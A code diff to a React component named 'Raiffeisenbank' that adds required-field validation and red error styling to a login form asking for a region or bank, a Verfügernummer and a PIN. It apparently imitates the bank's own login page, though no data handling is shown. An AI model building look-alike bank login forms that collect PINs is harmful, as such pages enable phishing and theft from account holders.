@@ -22,6 +22,9 @@ const Raiffeisenbank = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [selectOpen, setSelectOpen] = useState(false);
+  const [verfuegerTouched, setVerfuegerTouched] = useState(false);
+  const [pinTouched, setPinTouched] = useState(false);
+  const [bundeslandTouched, setBundeslandTouched] = useState(false);
   const dropdownRef = useRef<HTMLDivElement>(null);
 
   const selectHasValue = bundesland !== "";
@@ -62,16 +65,17 @@ const Raiffeisenbank = () => {
           <label
             className={`pointer-events-none absolute left-3 z-10 transition-all duration-200 ${
               selectLabelFloated
-                ? "top-1 text-xs text-gray-500"
-                : "top-3 text-sm text-gray-500"
+                ? `top-1 text-xs ${bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-500"}`
+                : `top-3 text-sm ${bundeslandTouched && !bundesland ? "text-red-600" : "text-gray-500"}`
             }`}
           >
-            Bundesland oder Bank wählen <span className="text-gray-400">*</span>
+            Bundesland oder Bank wählen <span className={bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
           <div
             onClick={() => setSelectOpen(!selectOpen)}
+            onBlur={() => setBundeslandTouched(true)}
             className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none ${
-              selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : "border-gray-300 bg-[#f4f4f4]"
+              selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : bundeslandTouched && !bundesland ? "border-red-600 bg-[#f4f4f4]" : "border-[#1a1a1a] bg-[#f4f4f4]"
             }`}
           >
             {bundesland || "\u00A0"}
@@ -95,7 +99,7 @@ const Raiffeisenbank = () => {
               }}
             >
               <div
-                onClick={() => { setBundesland(""); setSelectOpen(false); }}
+                onClick={() => { setBundesland(""); setSelectOpen(false); setBundeslandTouched(true); }}
                 className="cursor-pointer px-3 py-2 text-sm text-gray-400 hover:bg-gray-100"
               >
                 &nbsp;
@@ -103,7 +107,7 @@ const Raiffeisenbank = () => {
               {bundeslaender.map((bl) => (
                 <div
                   key={bl}
-                  onClick={() => { setBundesland(bl); setSelectOpen(false); }}
+                  onClick={() => { setBundesland(bl); setSelectOpen(false); setBundeslandTouched(true); }}
                   className={`cursor-pointer px-3 py-2 text-sm hover:bg-gray-100 ${
                     bundesland === bl ? "bg-gray-100 font-semibold" : ""
                   }`}
@@ -111,6 +115,12 @@ const Raiffeisenbank = () => {
                   {bl}
                 </div>
               ))}
+            </div>
+          )}
+          {bundeslandTouched && !bundesland && !selectOpen && (
+            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
+              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
+              Pflichtfeld
             </div>
           )}
         </div>
@@ -121,12 +131,23 @@ const Raiffeisenbank = () => {
             type="text"
             value={verfueger}
             onChange={(e) => setVerfueger(e.target.value)}
+            onBlur={() => setVerfuegerTouched(true)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+              verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
+            }`}
           />
-          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
-            Verfügernummer eingeben <span className="text-gray-400">*</span>
+          <label className={`pointer-events-none absolute left-3 top-3 text-sm transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
+            verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-500"
+          }`}>
+            Verfügernummer eingeben <span className={verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
+          {verfuegerTouched && !verfueger && (
+            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
+              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
+              Pflichtfeld
+            </div>
+          )}
         </div>
 
         {/* PIN */}
@@ -136,12 +157,23 @@ const Raiffeisenbank = () => {
             maxLength={5}
             value={pin}
             onChange={(e) => setPin(e.target.value)}
+            onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+              pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
+            }`}
           />
-          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
-            PIN eingeben <span className="text-gray-400">*</span>
+          <label className={`pointer-events-none absolute left-3 top-3 text-sm transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
+            pinTouched && !pin ? "text-red-600" : "text-gray-500"
+          }`}>
+            PIN eingeben <span className={pinTouched && !pin ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
+          {pinTouched && !pin && (
+            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
+              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
+              Pflichtfeld
+            </div>
+          )}
         </div>
 
         {/* Weiter Button */}
